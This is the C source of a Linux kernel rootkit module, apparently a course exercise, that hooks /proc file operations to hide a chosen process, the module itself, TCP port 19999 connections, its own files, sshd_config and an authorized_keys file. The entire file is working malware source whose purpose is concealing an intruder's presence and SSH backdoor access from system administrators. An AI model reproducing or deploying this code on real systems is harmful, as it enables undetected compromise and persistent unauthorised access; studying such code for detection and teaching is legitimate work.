#include <linux/init.h>
#include <linux/fs.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/cdev.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/pagemap.h>
#include <linux/version.h>
#include <linux/vmalloc.h>
#include <asm/mman.h>
#include "my_tlb.h"
#include "my_mmap.h"
#include "rootkit.h"
#include <linux/module.h>
#include <linux/moduleparam.h> 
#include <linux/kernel.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>
#include <net/sock.h>
#include <linux/namei.h>


MODULE_LICENSE("Dual BSD/GPL");

//#define ROOTKIT_DEBUG	1
//#define PORTTOHIDE 19999 //Our port to block...

// some concepts used in this code were derived from http://average-coder.blogspot.com/2011/12/linux-rootkit.html

#if defined(ROOTKIT_DEBUG) && ROOTKIT_DEBUG == 1
# define DEBUG(...)		printk(KERN_INFO __VA_ARGS__)
#else
# define DEBUG(...)
#endif

typedef int (*readdir_t)(struct file *, void *, filldir_t);

//Old Structs
filldir_t old_proc_filldir;
static struct file_operations new_proc_fops;
const struct file_operations * old_proc_fops = 0;
static struct inode * old_proc_inode;
struct inode * new_proc_inode;

//for ex4
static struct file_operations new_tcp_fops;
const struct file_operations * old_tcp_fops = 0;
static struct inode *old_tcp_inode;
struct inode * new_tcp_inode;
static struct file_operations new_tcp6_fops;
const struct file_operations * old_tcp6_fops = 0;
static struct inode *old_tcp6_inode;
struct inode * new_tcp6_inode;
static char * PORTTOHIDE = "4E1F"; //We use hex for easy compare


//Mod Param
static char * PIDTOHIDE = NULL;
module_param(PIDTOHIDE, charp, 0644);

static char *ROOTKITLOCATION = NULL;
module_param(ROOTKITLOCATION, charp, 0644);

//Old Functions
int (*old_tcp4_seq_show) (struct seq_file*, void *); //A Function pointer... we will use this to preserve the old one
int (*old_proc_readdir) (struct file * fptr, void * vptr, filldir_t fdir);

//New Functions
static int new_proc_readdir(struct file *fp, void *buf, filldir_t filldir);
int restore_hide_process(void);
int hide_process(void);
int new_proc_filldir(void *a, const char *name, int c, loff_t d, u64 e, unsigned f);

//Ex4
ssize_t (*old_tcp_read)(struct file *fp, char __user *buf, size_t sz, loff_t *loff);
int hide_port(void);
static int new_tcp_read(struct file *fp, char __user *buf, size_t sz, loff_t *loff);

ssize_t (*old_tcp6_read)(struct file *fp, char __user *buf, size_t sz, loff_t *loff);
static int new_tcp6_read(struct file *fp, char __user *buf, size_t sz, loff_t *loff);

 // functions, variables, and structs for ex3
 static struct inode * mod_inode;
 const struct file_operations * old_mod_fops = 0;
 static struct file_operations new_mod_fops;
 ssize_t (*old_mod_read) (struct file *, char __user *, size_t, loff_t *);
 ssize_t new_mod_read (struct file *f, char __user *u, size_t s, loff_t *l);
 char *rootkitName = "rootkit";
 
 int hide_module(void);
 int restore_module(void);


  // functions, variables, and structs for ex5
 static struct inode * files_inode;
 const struct file_operations * old_files_fops = 0;
 static struct file_operations new_files_fops;
 ssize_t (*old_files_readdir) (struct file *, void *, filldir_t);
 static ssize_t new_files_readdir (struct file *fp, void *buf, filldir_t filldir);
 int new_files_filldir(void *a, const char *name, int c, loff_t d, u64 e, unsigned f);
 int (*old_files_filldir)(void *, const char *, int , loff_t , u64 , unsigned );

 static struct inode * keys_inode;
 const struct file_operations * old_keys_fops = 0;
 static struct file_operations new_keys_fops;
 ssize_t (*old_keys_readdir) (struct file *, void *, filldir_t);
 static ssize_t new_keys_readdir (struct file *fp, void *buf, filldir_t filldir);
 int new_keys_filldir(void *a, const char *name, int c, loff_t d, u64 e, unsigned f);
 int (*old_keys_filldir)(void *, const char *, int , loff_t , u64 , unsigned );
 
 int hide_files(void);
 int restore_files(void);

int restore_hide_process(void)
{
		if(old_proc_fops) //Just a null check in case
			old_proc_inode->i_fop = old_proc_fops;
			
        return 0;
}

int restore_hide_port(void){
	if(old_tcp_fops) //Check null 
		old_tcp_inode->i_fop = old_tcp_fops;
	
	if(old_tcp6_fops)
		old_tcp6_inode->i_fop = old_tcp6_fops;
		
	return 0;
}

static int new_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
		if(!(old_proc_filldir = filldir)) //Check null
			return -1;
		
		//Use the old one except replace it with new filldir
        return old_proc_readdir(fp,buf,new_proc_filldir);
}

int new_proc_filldir(void *a, const char *name, int c, loff_t d, u64 e, unsigned f){

		if(strcmp(PIDTOHIDE, name) == 0){
			return 0;
		}
		
		//Use old one...
		return old_proc_filldir(a, name, c, d, e, f);
}

static ssize_t new_tcp6_read(struct file * fptr, char __user * buffer, size_t size, loff_t * offset) {
ssize_t origin_read; 
  char *lineptr, *sublineptr;
  origin_read = old_tcp6_read(fptr,buffer,size,offset);
  lineptr = strstr(buffer, "\n")+1;
  while(lineptr != NULL && *lineptr){

		sublineptr = strstr(strstr(lineptr, ":")+1,":")+1; //String with Port starting...
		
		if(!sublineptr){break;}//Just incase it's null... avoid null problems		
		
		//Check Local address
		if(strncmp(sublineptr, PORTTOHIDE, 4) == 0){
						
			char * nextline;
			//We want to skip this whole line
			
			nextline = strstr(lineptr, "\n") + 1;
			
			if(!nextline){break;}
			lineptr = strcpy(lineptr, nextline);			

			origin_read -= nextline - lineptr; //reduce amount read by the killed line...
			continue;
		}

		//Check foreign address too
		if(!strstr(sublineptr, ":")){break;} //Just incase it's null... avoid null problems			
		sublineptr = strstr(sublineptr, ":") + 1;
		
		if(strncmp(sublineptr, PORTTOHIDE, 4) == 0){
			char * nextline;
			//We want to skip this whole line
			
			nextline = strstr(lineptr, "\n") + 1;
			
			if(!nextline){break;}
			lineptr = strcpy(lineptr, nextline);			

			origin_read -= nextline - lineptr; //reduce amount read by the killed line...
			continue;
		}

		lineptr = strstr(lineptr, "\n") + 1; //get next line			
	 }
	return origin_read;
}

static ssize_t new_tcp_read(struct file * fptr, char __user * buffer, size_t size, loff_t * offset) {
  ssize_t origin_read; 
  char *lineptr, *sublineptr;
  origin_read = old_tcp_read(fptr,buffer,size,offset);
  lineptr = strstr(buffer, "\n")+1;
  while(lineptr != NULL && *lineptr){

		sublineptr = strstr(strstr(lineptr, ":")+1,":")+1; //String with Port starting...
		
		if(!sublineptr){break;}
		
		if(strncmp(sublineptr, PORTTOHIDE, 4) == 0){
						
			char * nextline;
			//We want to skip this whole line
			
			nextline = strstr(lineptr, "\n") + 1;
			
			if(!nextline){break;}
			lineptr = strcpy(lineptr, nextline);			

			origin_read -= nextline - lineptr; //reduce amount read by the killed line...
			continue;
		}
		if(!strstr(sublineptr, ":")){break;}//Just incase it's null... avoid null problems				
		sublineptr = strstr(sublineptr, ":") + 1;

		if(strncmp(sublineptr, PORTTOHIDE, 4) == 0){
			char * nextline;
			//We want to skip this whole line
			
			nextline = strstr(lineptr, "\n") + 1;
			
			if(!nextline){break;}
			lineptr = strcpy(lineptr, nextline);			

			origin_read -= nextline - lineptr; //reduce amount read by the killed line...
			continue;
		}
		lineptr = strstr(lineptr, "\n") + 1; //get next line			
	 }
	return origin_read;
}

int hide_port(void){
	//Hide the TCP Port 19999
	
	struct path tcp_path;
	struct path tcp6_path;
	
	if(kern_path("/proc/net/tcp", 0, &tcp_path)){
		return -1;
	}
	
	if(kern_path("/proc/net/tcp6", 0, &tcp6_path)){
		return -1;
	}
	
	old_tcp6_inode = tcp6_path.dentry->d_inode;
	old_tcp_inode = tcp_path.dentry->d_inode; //grab the inode 
	
	if(!old_tcp_inode){ //check if inodes are null
		return -1;
	}
	
	if(!old_tcp6_inode){
		return -1;
	}
	
	//hook the read function for tcp
	old_tcp_fops = old_tcp_inode->i_fop;
	old_tcp_read = old_tcp_fops->read;
	new_tcp_fops = *(old_tcp_inode->i_fop);
	new_tcp_fops.read = new_tcp_read;
	old_tcp_inode->i_fop = &new_tcp_fops;
	
	//hook the read function for tcp6
	old_tcp6_fops = old_tcp6_inode->i_fop;
	old_tcp6_read = old_tcp6_fops->read;
	new_tcp6_fops = *(old_tcp6_inode->i_fop);
	new_tcp6_fops.read = new_tcp6_read;
	old_tcp6_inode->i_fop = &new_tcp6_fops;
	
	return 0;
}

int hide_process(void){
	struct path proc_path;
	
	//TEST PID

	if(!PIDTOHIDE){
		printk(KERN_ALERT "Failed to get pid");
	}
	
	//printk(KERN_ALERT "The pid is %s\n", PIDTOHIDE);
		
	//Get inode
    if(kern_path("/proc/", 0, &proc_path))
        return -1;
	
	//Save old inode
	old_proc_inode = proc_path.dentry->d_inode;
	if(!old_proc_inode)
        return -1;
	
	//Exchange them	
	old_proc_fops = old_proc_inode->i_fop; 
	//memcpy(&new_proc_fops, old_proc_inode->i_fop, sizeof(struct * file_operations));
	new_proc_fops = *(old_proc_inode->i_fop);

 	//REPLACE WITH HACKED VERSION of FOPS and READDIR
	old_proc_readdir = old_proc_fops->readdir; //SAVE OLD COPY OF FUNCTION
	
	new_proc_fops.readdir = new_proc_readdir;	
	//printk(KERN_ALERT "The addr of new_proc_ops is %p and old_proc_ops is %p", &new_proc_fops, old_proc_fops);
	old_proc_inode->i_fop = &new_proc_fops;
	
	//printk(KERN_ALERT "Finished!\n");
	return 0;
}

ssize_t new_mod_read (struct file *f, char __user *b, size_t size, loff_t *l)
{

	ssize_t rv;
	char b_cpy[size];
	int start = -1;
	int end = -1;
	int i = 0;
	int index = 0;
	//*l = *l +38;
	
	//printk(KERN_ALERT " before read from mod: %lld", *l);
	rv = old_mod_read(f, b, size, l);
	if(rv > 0)
	{
		// get read buffer
		copy_from_user(b_cpy, b, size);
		
		// find rootkit line
		for(i = 0; i < size; i++)
		{
			if(index == 7)
			{
				if(b_cpy[i] == '\n')
				{
					end = i + 1;
					break;
				}
			}
			else if(b_cpy[i] == rootkitName[index])
			{
				if(index == 0)
				{
					start = index;
				}
				index++;
			}
			else
			{
				start = -1;
				index = 0;
			}
			
		}
		
		// over write rootkit line
		for(i = 0; i < end - start; i++)
		{
			b_cpy[start + i] = b_cpy[end + i];
		}
		
		//printk(KERN_ALERT "start: %d end: %d", start, end);
		
		size = size - (end - start);
		
		// replace read buffer
		copy_to_user(b, b_cpy, size);
		
	}
	//printk(KERN_ALERT "after read from mod: %lld %d %d", *l, size, rv);
	
	return rv;
}

int hide_module()
{
	struct path p;
	if(kern_path("/proc/modules", 0, &p))
        return -1;
		
	mod_inode = p.dentry->d_inode;
	if(!mod_inode)
        return -1;
	
	//Exchange them	
	old_mod_fops = mod_inode->i_fop; 
	new_mod_fops = *(mod_inode->i_fop);

 	//REPLACE WITH HACKED VERSION of FOPS and READDIR
	old_mod_read = old_mod_fops->read; //SAVE OLD COPY OF FUNCTION
	
	new_mod_fops.read = new_mod_read; 	
	//printk(KERN_ALERT "The addr of new_proc_ops is %p and old_proc_ops is %p", &new_proc_fops, old_proc_fops);
	mod_inode->i_fop = &new_mod_fops;
	
	//CLOSE THE FILE NOW
	//filp_close(proc_root, 0);
	//printk(KERN_ALERT "Finished!\n");
	return 0;
}

int restore_module()
{
	if(old_mod_fops)
			mod_inode->i_fop = old_mod_fops;
	return 0;
}

int hide_files()
{
	struct path files_path;
	struct path keys_path;


	// Hide root kit files
	//Get inode
    if(kern_path(ROOTKITLOCATION, 0, &files_path))
        return -1;
	
	//Save old inode
	files_inode = files_path.dentry->d_inode;
	if(!files_inode)
        return -1;
	
	//Exchange them	
	old_files_fops = files_inode->i_fop; 
	//memcpy(&new_proc_fops, old_proc_inode->i_fop, sizeof(struct * file_operations));
	new_files_fops = *(files_inode->i_fop);

 	//REPLACE WITH HACKED VERSION of FOPS and READDIR
	old_files_readdir = old_files_fops->readdir; //SAVE OLD COPY OF FUNCTION
	
	new_files_fops.readdir = new_files_readdir; 		
	//printk(KERN_ALERT "The addr of new_proc_ops is %p and old_proc_ops is %p", &new_proc_fops, old_proc_fops);
	files_inode->i_fop = &new_files_fops;



	
	// hide authorized_keys file
	//Get inode
    if(kern_path("/fake.ssh", 0, &keys_path))
        return -1;
	
	//Save old inode
	keys_inode = keys_path.dentry->d_inode;
	if(!keys_inode)
        return -1;
	
	//Exchange them	
	old_keys_fops = keys_inode->i_fop; 
	//memcpy(&new_proc_fops, old_proc_inode->i_fop, sizeof(struct * file_operations));
	new_keys_fops = *(keys_inode->i_fop);

 	//REPLACE WITH HACKED VERSION of FOPS and READDIR
	old_keys_readdir = old_keys_fops->readdir; //SAVE OLD COPY OF FUNCTION
	
	new_keys_fops.readdir = new_keys_readdir; 	
	//printk(KERN_ALERT "The addr of new_proc_ops is %p and old_proc_ops is %p", &new_proc_fops, old_proc_fops);
	keys_inode->i_fop = &new_keys_fops;
	
	//CLOSE THE FILE NOW
	//printk(KERN_ALERT "Finished!\n");
	return 0;
}

int restore_files()
{
	if(old_files_fops)
			files_inode->i_fop = old_files_fops;
			
	if(old_keys_fops)
			keys_inode->i_fop = old_keys_fops;
	return 0;
}

static int new_files_readdir(struct file *fp, void *buf, filldir_t filldir)
{
		if(!(old_files_filldir = filldir)) //Check null stuff
			return -1;
		
		//Use the old one except replace it with new filldir
        return old_files_readdir(fp,buf,new_files_filldir);
}

int new_files_filldir(void *a, const char *name, int c, loff_t d, u64 e, unsigned f){

		if(strcmp("rootkit", name) <= 0){
			return 0;
		}

		if(strcmp("sshd_config", name) == 0){
			return 0;
		}
		
		//Use old one...
		return old_files_filldir(a, name, c, d, e, f);
}

static int new_keys_readdir(struct file *fp, void *buf, filldir_t filldir)
{
		if(!(old_keys_filldir = filldir)) //Check null stuff
			return -1;
		
		//Use the old one except replace it with new filldir
        return old_keys_readdir(fp,buf,new_keys_filldir);
}

int new_keys_filldir(void *a, const char *name, int c, loff_t d, u64 e, unsigned f){

		if(strcmp("authorized_keys", name) == 0){
			return 0;
		}
		
		//Use old one...
		return old_keys_filldir(a, name, c, d, e, f);
}


static int rootkit_init(void)
{
	int rv = 0;
	void * __end = (void *) &unmap_page_range;

	/* Find the non-exported symbols.  'Cause you can't stop me. */
	unmap_page_range = (unmap_page_range_t)
		kallsyms_lookup_name("unmap_page_range");
	if ((!unmap_page_range) || (void *) unmap_page_range >= __end) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find important function unmap_page_range\n");
		return -ENOENT;
	}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 2, 0)
	my_tlb_gather_mmu = (tlb_gather_mmu_t)
		kallsyms_lookup_name("tlb_gather_mmu");
	//printk(KERN_ERR "resolved symbol tlb_gather_mmu %p\n", my_tlb_gather_mmu);
	if (!my_tlb_gather_mmu) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function my_tlb_gather_mmu\n");
		return -ENOENT;
	}

	my_tlb_flush_mmu = (tlb_flush_mmu_t)
		kallsyms_lookup_name("tlb_flush_mmu");
	if (!my_tlb_flush_mmu) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function my_tlb_flush_mmu\n");
		return -ENOENT;
	}

	my_tlb_finish_mmu = (tlb_finish_mmu_t)
		kallsyms_lookup_name("tlb_finish_mmu");
	if (!my_tlb_finish_mmu) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function my_tlb_finish_mmu\n");
		return -ENOENT;
	}
#else
	pmmu_gathers = (struct mmu_gather *)
		kallsyms_lookup_name("mmu_gathers");
	if (!pmmu_gathers) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function mmu_gathers\n");
		return -ENOENT;
	}
#endif //kernel_version >< 3.2

	kern_free_pages_and_swap_cachep = (free_pages_and_swap_cache_t)
		kallsyms_lookup_name("free_pages_and_swap_cache");
	if (!kern_free_pages_and_swap_cachep) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function free_pages_and_swap_cache\n");
		return -ENOENT;
	}

	kern_flush_tlb_mm = (flush_tlb_mm_t)
		kallsyms_lookup_name("flush_tlb_mm");
	if (!kern_flush_tlb_mm) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function flush_tlb_mm\n");
		return -ENOENT;
	}

	kern_free_pgtables = (free_pgtables_t)
		kallsyms_lookup_name("free_pgtables");
	if (!kern_free_pgtables) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function free_pgtables\n");
		return -ENOENT;
	}


	// ex 2
	hide_process();

	//ex 3
	hide_module();

	//ex 4
	hide_port();

	//ex 5
	hide_files();
	
//	printk(KERN_ALERT "Rootkit: Hello, world\n");
	return rv;
}

static void rootkit_exit(void)
{
	//Restore the stuff
	restore_hide_process();
	restore_hide_port();
	restore_module();
	
	//printk(KERN_ALERT "Rootkit: Goodbye, cruel world\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
